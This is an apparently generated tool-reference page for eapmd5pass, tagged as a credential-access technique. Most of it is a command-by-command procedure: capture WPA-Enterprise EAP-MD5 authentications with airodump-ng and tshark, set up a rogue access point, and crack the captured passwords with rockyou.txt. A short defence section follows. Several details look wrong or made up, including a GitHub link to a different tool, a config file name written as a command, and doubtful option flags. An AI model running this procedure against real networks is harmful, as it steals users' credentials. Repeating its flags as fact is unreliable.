---
title: eapmd5pass
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - eap
  - enterprise
  - md5
  - dictionary
difficulty: advanced
os: linux
install: sudo apt install eapmd5pass
github: https://github.com/joswr1ght/cowpatty
related:
  - freeradius
  - hostapd-wpe
  - radtest
---

# eapmd5pass

## Chapter 1: Overview

**eapmd5pass** performs offline dictionary attacks against EAP-MD5 challenge/response exchanges captured from WPA-Enterprise (802.1X) authentication. This tool cracks user credentials from captured authentication traffic.

### Key Features

- **Offline EAP-MD5 cracking**: No network interaction needed
- **Dictionary attack**: Wordlist-based password recovery
- **Challenge-response**: Exploits MD5 vulnerability in EAP-MD5
- **Enterprise focus**: Targets WPA-Enterprise deployments

### Vulnerability

```
EAP-MD5 Weakness:
1. Challenge-response uses MD5 (weak)
2. Password hash = MD5(password + challenge)
3. Dictionary attack against captured challenge
4. Reveals user credentials
```

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install eapmd5pass
```

### Dependencies

```bash
# May need cowpatty for some operations
sudo apt install cowpatty
```

---

## Chapter 3: Capturing EAP Traffic

### Using Airodump-ng

```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w eap_capture wlan0mon
```

### Using Wireshark

```bash
# Filter for EAP
wireshark -i wlan0mon -f "eap"
```

### EAP-MD5 Filters

```bash
# Capture only EAP-MD5
tshark -i wlan0mon -f "ether proto 0x888e" -w eap_traffic.pcap
```

---

## Chapter 4: Basic Usage

### Dictionary Attack

```bash
eapmd5pass -r eap_capture.pcap -w wordlist.txt
```

### Specify Interface

```bash
eapmd5pass -r eap_capture.pcap -w wordlist.txt -i wlan0
```

### Verbose Output

```bash
eapmd5pass -r eap_capture.pcap -w wordlist.txt -v
```

---

## Chapter 5: Attack Process

### Step 1: Capture Authentication

```bash
# Start capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise_capture wlan0mon

# Wait for user authentication
```

### Step 2: Extract EAP-MD5

```bash
# Filter EAP packets
eapmd5pass -r enterprise_capture-01.cap -w wordlist.txt
```

### Step 3: Crack Password

```bash
# Use extracted challenge-response
eapmd5pass -r extracted_eap.pcap -w /usr/share/wordlists/rockyou.txt
```

---

## Chapter 6: Advanced Features

### Multiple Captures

```bash
eapmd5pass -r capture1.pcap -r capture2.pcap -w wordlist.txt
```

### Custom Wordlist

```bash
eapmd5pass -r eap.pcap -w custom_wordlist.txt
```

### Hashcat Conversion

```bash
# Convert to hashcat format
eapmd5pass -r eap.pcap -o hash.txt -J
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Test Enterprise Security

```bash
# Capture authentication
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w test_capture wlan0mon

# Wait for user login, then crack
eapmd5pass -r test_capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

### Scenario 2: Rogue AP Attack

```bash
# Create rogue AP with EAP-MD5
hostapd-wpe.conf

# Capture credentials
eapmd5pass -r rogue_capture.pcap -w wordlist.txt
```

---

## Chapter 8: Mitigation & Defense

**For network administrators:**

- **Use EAP-TLS** (certificate-based, strongest)
- **Avoid EAP-MD5** (inherently weak)
- **Implement EAP-PEAP** or **EAP-TTLS**
- **Use strong passwords** for EAP credentials
- **Monitor for rogue APs**
- **Implement RADIUS logging**
- **Regular credential rotation**

### Secure EAP Methods

| Method | Security | Notes |
|--------|----------|-------|
| EAP-TLS | Strongest | Certificate-based |
| EAP-TTLS | Strong | Password + tunnel |
| EAP-PEAP | Good | Password + tunnel |
| EAP-MD5 | Weak | Vulnerable to offline attack |

---

## Resources

- [eapmd5pass Source](https://github.com/joswr1ght/cowpatty)
- [EAP Security](https://tools.ietf.org/html/rfc3748)
- [WPA-Enterprise Guide](https://www.wi-fi.org/discover-wi-fi/wpa3)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)

---

*Generated for educational purposes in authorized security testing environments only.*
